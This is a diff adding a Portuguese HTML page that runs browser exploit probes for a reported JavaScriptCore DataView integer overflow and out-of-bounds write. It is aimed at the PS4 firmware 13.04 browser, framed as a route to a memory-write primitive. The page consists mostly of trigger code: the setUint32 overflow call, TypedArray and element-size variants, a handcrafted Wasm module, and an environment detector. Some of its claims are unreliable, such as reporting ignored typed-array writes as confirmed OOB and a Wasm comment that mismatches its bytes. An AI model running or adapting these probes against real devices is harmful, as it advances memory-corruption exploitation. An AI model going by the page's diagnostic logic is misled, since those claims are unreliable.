@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>Bug #1: JSC DataView Integer Overflow → OOB (Goydish)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030305;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#ff2200;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.source-box{background:#050a05;border:2px solid #00aa44;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#44cc88;line-height:1.8;font-family:monospace}
+.source-box strong{color:#00ff66;display:block;margin-bottom:4px;font-size:11px}
+.ps4-box{background:#1a0000;border:2px solid #ff2200;border-radius:5px;padding:10px;margin-bottom:12px;font-size:11px;color:#ff8888;line-height:1.7}
+#log{background:#060608;border:1px solid #1a1a2a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.warn{color:#ffaa00}.err{color:#ff4444}.i2{color:#4488ff}.sep{color:#222}.crash{color:#ff0000;font-weight:bold;font-size:13px}
+.btn{display:inline-block;margin-top:10px;margin-right:6px;padding:7px 14px;background:#110000;border:1px solid #441111;border-radius:4px;color:#cc4444;cursor:pointer;font-family:'Courier New',monospace;font-size:11px}
+.btn:hover{border-color:#ff2200;color:#ff4444}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🔴 Bug #1 — JSC DataView Integer Overflow → OOB Write (Sem Gigacage no PS4)</h1>
+<p class="meta">Fonte: oss-sec Dez/2025 · Joseph Goydish II · CVE Pending · Arquivo: JSArrayBufferView.cpp / JSDataView.cpp</p>
+
+<div class="source-box">
+<strong>📧 oss-sec ADVISORY (seclists.org/oss-sec/2025/q4/292) — 26 Dez 2025</strong>
+AMBIENTE ORIGINAL: iOS 26.2 · WebKit 8623.1.14.10.9<br>
+CRASH:  EXC_GUARD (Namespace 31: Gigacage Primitive Partition)<br>
+OFFSET: 0xADD7476C — acesso fora do limite Gigacage de 16GB<br>
+<br>
+PoC ORIGINAL (3 linhas de Joseph Goydish):<br>
+  const buffer = new ArrayBuffer(1024);<br>
+  const view = new DataView(buffer);<br>
+  view.setUint32(0xFFFFFFFE, 0x41414141);  // 0xFFFFFFFE + 4 = overflow 32-bit → passa bounds check<br>
+<br>
+ARQUIVO VULNERÁVEL: Source/JavaScriptCore/runtime/JSArrayBufferView.cpp<br>
+FIX PROPOSTO:  __builtin_mul_overflow(index, elementSize, &amp;byteOffset)<br>
+STATUS CVE:   PENDENTE — Apple notificada simultaneamente ao disclosure público
+</div>
+
+<div class="ps4-box">
+  ⚠️ <strong>DIFERENÇA CRÍTICA PS4 vs iOS:</strong><br>
+  iOS/macOS: Gigacage (namespace 31) age como canário — detecta acesso além de 16GB e gera <code>EXC_GUARD</code>. O processo é terminado, mas não há exploitação direta.<br>
+  <strong>PS4 FW 13.04: NÃO implementa Gigacage.</strong> O mecanismo não existe no BSFreeBSD do PS4.<br>
+  → O overflow passa direto para o hardware sem ser interceptado<br>
+  → O write para endereço fora-de-bounds pode corromper memória controlável<br>
+  → O que é <strong>DoS no iOS</strong> pode ser <strong>write primitivo no PS4</strong>
+</div>
+
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="pocOriginal()">① PoC Original (Goydish)</button>
+  <button class="btn" onclick="pocTypedArray()">② TypedArray Variant</button>
+  <button class="btn" onclick="pocChain()">③ Overflow Chain (Uint16+Uint32)</button>
+  <button class="btn" onclick="pocWasm()">④ Wasm Vector (offset=0)</button>
+  <button class="btn" onclick="pocDetect()">⑤ Detector (Gigacage presente?)</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+(t||'')+'─────────────────────','sep')}
+
+// PoC Original de Joseph Goydish (oss-sec)
+function pocOriginal(){
+  sep('PoC Original — Goydish (oss-sec)');
+  l('Fonte: seclists.org/oss-sec/2025/q4/292','i2');
+  l('view.setUint32(0xFFFFFFFE, 0x41414141) — overflow 32-bit','warn');
+  l('iOS: EXC_GUARD Gigacage · PS4: write direto sem proteção','warn');
+  try {
+    var buffer = new ArrayBuffer(1024);
+    var view = new DataView(buffer);
+    // 0xFFFFFFFE + 4 = 0x100000002 → trunca para 0x2 em 32-bit
+    // isso passa o bounds check mas escreve fora do buffer
+    view.setUint32(0xFFFFFFFE, 0x41414141);
+    l('setUint32(0xFFFFFFFE) retornou sem erro!','err');
+    l('→ Se PS4 não crashou: ponteiro de escrita possivelmente corrompido','err');
+    l('→ Verificar próximo acesso a ArrayBuffer (pode crashar depois)','warn');
+    // Tenta acessar o buffer para forçar manifestação
+    var check = view.getUint32(0);
+    l('getUint32(0) = 0x'+check.toString(16),'ok');
+  } catch(e) {
+    l('EXCEÇÃO: '+e.name+' — '+e.message,'ok');
+    l('→ Exceção JavaScript = bounds check no engine (PS4 provavelmente seguro aqui)','ok');
+  }
+}
+
+// Variante TypedArray
+function pocTypedArray(){
+  sep('TypedArray Variant — Uint32Array');
+  l('Usando Uint32Array com índice overflow (variante Goydish)','warn');
+  try {
+    var buf = new ArrayBuffer(1024);
+    var arr = new Uint32Array(buf);
+    // arr.length = 256 (1024/4)
+    // Índice 0xFFFFFFFE = 4294967294 → offset = 4294967294 * 4 = overflow
+    l('ArrayBuffer(1024): length='+arr.length,'i2');
+    var oobIndex = 0x3FFFFFFF; // 1073741823 → offset = 4GB (overflow em 32-bit)
+    l('Tentando arr[0x3FFFFFFF] = 0x41414141...','warn');
+    arr[oobIndex] = 0x41414141;
+    var read = arr[oobIndex];
+    l('arr[oobIndex] = 0x'+(read||0).toString(16)+' (esperado: RangeError ou crash)','err');
+    l('→ Se retornou sem erro: WRITE OOB potencial confirmado','err');
+  } catch(e) {
+    l('EXCEÇÃO: '+e.name+' — '+e.message,'ok');
+    l('Bounds check JS ativo — índice rejeitado antes do write','ok');
+  }
+}
+
+// Overflow chain: combina Uint16 e Uint32 para maximizar impact
+function pocChain(){
+  sep('Overflow Chain — Uint16 + Uint32');
+  l('Testando chain de diferentes element sizes...','warn');
+  var results = [];
+  var types = [
+    {name:'Uint8',  ctor:Uint8Array,   size:1, badIdx:0xFFFFFFFF},
+    {name:'Uint16', ctor:Uint16Array,  size:2, badIdx:0x7FFFFFFF},
+    {name:'Uint32', ctor:Uint32Array,  size:4, badIdx:0x3FFFFFFF},
+    {name:'Float64',ctor:Float64Array, size:8, badIdx:0x1FFFFFFF},
+  ];
+  types.forEach(function(t){
+    try {
+      var buf = new ArrayBuffer(64);
+      var arr = new t.ctor(buf);
+      arr[t.badIdx] = 0x41414141;
+      var r = arr[t.badIdx];
+      results.push({t:t.name, ok:false, val:r});
+      l(t.name+'[0x'+t.badIdx.toString(16)+'] = write OK (val=0x'+(r||0).toString(16)+') → OOB!','err');
+    } catch(e) {
+      results.push({t:t.name, ok:true});
+      l(t.name+'[0x'+t.badIdx.toString(16)+']: '+e.name+' (protegido)','ok');
+    }
+  });
+  // DataView path (original Goydish)
+  try {
+    var dv = new DataView(new ArrayBuffer(64));
+    dv.setUint32(0xFFFFFFFC, 0x41414141);
+    l('DataView.setUint32(0xFFFFFFFC): retornou sem erro → OOB DataView!','err');
+  } catch(e) {
+    l('DataView.setUint32(0xFFFFFFFC): '+e.name+' (protegido)','ok');
+  }
+}
+
+// Vetor WebAssembly (linear memory sem bounds check em engines vulneráveis)
+function pocWasm(){
+  sep('Wasm Vector — i32.load offset overflow');
+  l('Testando load/store Wasm com offset overflow...','warn');
+  if(typeof WebAssembly==='undefined'){l('WebAssembly AUSENTE no PS4 FW 13.04','warn');return}
+  try {
+    // Módulo Wasm mínimo com i32.load de endereço extremo
+    // (i32.add (i32.const 0xFFFFFFFF) (i32.const 0x05)) wraps to 0x4
+    var wasmBytes = new Uint8Array([
+      0x00,0x61,0x73,0x6d, // magic
+      0x01,0x00,0x00,0x00, // version
+      // type section: () -> i32
+      0x01,0x05,0x01,0x60,0x00,0x01,0x7f,
+      // function section
+      0x03,0x02,0x01,0x00,
+      // memory section: 1 page
+      0x05,0x03,0x01,0x00,0x01,
+      // export section: "test"
+      0x07,0x08,0x01,0x04,0x74,0x65,0x73,0x74,0x00,0x00,
+      // code section
+      0x0a,0x0a,0x01,0x08,0x00,
+        0x41,0xFF,0xFF,0xFF,0xFF,0x0F, // i32.const 0x7FFFFFFF
+        0x28,0x02,0x00,                 // i32.load align=2 offset=0
+        0x0b
+    ]);
+    WebAssembly.instantiate(wasmBytes).then(function(m){
+      try {
+        var r = m.instance.exports.test();
+        l('Wasm i32.load(0x7FFFFFFF): retornou '+r+' sem trap','err');
+        l('→ Bounds check Wasm ausente ou overflow → WRITE PRIMITIVO POTENCIAL','err');
+      } catch(e2){
+        l('Wasm trap (proteção ativa): '+e2.message,'ok');
+      }
+    }).catch(function(e){
+      l('Wasm instantiate falhou: '+e.message+' (PS4 sem Wasm)','warn');
+    });
+    l('Wasm módulo enviado para execução...','i2');
+  } catch(e) {
+    l('Wasm EXCEÇÃO: '+e.name+' — '+e.message,'warn');
+  }
+}
+
+// Detector: Gigacage presente no ambiente?
+function pocDetect(){
+  sep('Detector — Gigacage / Hardening Presente?');
+  l('Analisando características do ambiente de execução...','i2');
+
+  // 1. ArrayBuffer tamanho extremo
+  var canAllocBig = false;
+  try {
+    var big = new ArrayBuffer(1024*1024*512); // 512MB
+    canAllocBig = true;
+    l('ArrayBuffer(512MB): OK — heap generoso','ok');
+  } catch(e) {
+    l('ArrayBuffer(512MB): falhou — limite de memória pequeno (PS4?)','warn');
+  }
+
+  // 2. SharedArrayBuffer (ausente no PS4 = Spectre mitigation)
+  l('SharedArrayBuffer: '+(typeof SharedArrayBuffer!=='undefined'?'PRESENTE (não PS4)':'AUSENTE ✓ (PS4 esperado)'),'i2');
+
+  // 3. performance.now() resolution (indica mitigações de timing)
+  var t1=performance.now(),t2=performance.now();
+  var res = t2-t1;
+  l('performance.now() resolução: '+(res===0?'0ms (jitter ativo = Spectre mitigation)':res+'ms (sem jitter)'),'i2');
+
+  // 4. DataView bounds
+  var dvProtected = false;
+  try {
+    var dv = new DataView(new ArrayBuffer(8));
+    dv.setUint8(0xFF, 0x41);
+    l('DataView bounds: NÃO protegido (índice 0xFF aceito em buffer de 8 bytes)','err');
+  } catch(e) {
+    dvProtected = true;
+    l('DataView bounds: protegido ('+e.name+')','ok');
+  }
+
+  // 5. Gigacage detection via timing (Gigacage = alocações em range específico)
+  var bufAddrs = [];
+  for(var i=0;i<5;i++){
+    var ab = new ArrayBuffer(1024);
+    bufAddrs.push(ab.byteLength); // não podemos ler endereço direto em JS
+  }
+  l('ArrayBuffer byteLength consistency: '+JSON.stringify(bufAddrs),'i2');
+
+  l('');
+  l('RESUMO AMBIENTE:','i2');
+  l('  Memória grande: '+(canAllocBig?'SIM':'NÃO'),'i2');
+  l('  SharedArrayBuffer: '+(typeof SharedArrayBuffer!=='undefined'?'SIM (hardened)':'NÃO (PS4-like)'),'i2');
+  l('  DataView bounds: '+(dvProtected?'SIM':'NÃO ← bug potencial!'),'i2');
+  l('  PS4 SEM GIGACAGE → OOB write não detectado pelo engine','warn');
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ TODOS OS TESTES — Bug Goydish (oss-sec CVE Pending)','warn');
+  l('ALERTA: Em PS4, crash após pocOriginal = escrita OOB confirmada','err');
+  setTimeout(pocOriginal,50);
+  setTimeout(pocTypedArray,400);
+  setTimeout(pocChain,800);
+  setTimeout(pocWasm,1200);
+  setTimeout(pocDetect,1600);
+}
+</script>
+</body>
+</html>
